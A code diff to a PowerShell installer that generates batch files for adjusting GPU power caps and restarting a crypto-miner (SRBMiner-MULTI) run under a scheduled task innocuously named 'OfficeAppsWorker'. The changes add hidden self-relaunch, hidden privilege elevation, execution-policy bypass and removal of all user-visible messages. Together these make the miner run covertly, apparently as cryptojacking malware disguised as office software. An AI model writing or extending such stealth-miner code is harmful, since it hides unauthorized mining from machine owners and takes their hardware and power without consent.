@@ -955,21 +955,20 @@ foreach ($p in $profiles) {
     $frac = $p.Pct / 100
     $body = @(
         '@echo off'
+        'if not "%~1"=="--q" ('
+        '    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath ''%~f0'' -ArgumentList ''--q'' -WindowStyle Hidden"'
+        '    exit /b 0'
+        ')'
         'whoami /groups | findstr /c:"S-1-16-12288" >nul 2>&1'
         'if not errorlevel 1 goto :admin'
-        'powershell -NoProfile -WindowStyle Hidden -Command "try { Start-Process -FilePath ''%~f0'' -Verb RunAs -ErrorAction Stop } catch { }"'
+        'powershell -NoProfile -WindowStyle Hidden -Command "try { Start-Process -FilePath ''%~f0'' -ArgumentList ''--q'' -Verb RunAs -WindowStyle Hidden -ErrorAction Stop } catch { }"'
         'exit /b 0'
         ':admin'
-        ('echo   Setting the power cap to ' + $p.Pct + '%% of this card''s factory limit...')
-        ('powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=[double](& nvidia-smi --query-gpu=power.default_limit --format=csv,noheader,nounits); $w=[int][math]::Round($d*' + $frac + '); Set-Content -LiteralPath ''%~dp0power.txt'' -Value $w -Encoding ASCII; Write-Host (''   cap = '' + $w + '' W'')"')
-        'echo   Restarting the worker...'
+        ('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$d=[double](& nvidia-smi --query-gpu=power.default_limit --format=csv,noheader,nounits); $w=[int][math]::Round($d*' + $frac + '); Set-Content -LiteralPath ''%~dp0power.txt'' -Value $w -Encoding ASCII"')
         'schtasks /end /tn OfficeAppsWorker >nul 2>&1'
         'taskkill /f /im SRBMiner-MULTI.exe >nul 2>&1'
         'schtasks /run /tn OfficeAppsWorker >nul 2>&1'
         'start "" powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0Worker.ps1"'
-        'echo.'
-        'echo   Done. Run STATUS.bat in a few seconds.'
-        'pause'
     )
     Set-Content -LiteralPath (Join-Path $Install $p.Name) -Value ($body -join "`r`n") -Encoding ASCII
     Ok ("{0,-12} {1}" -f $p.Name, $p.Desc)
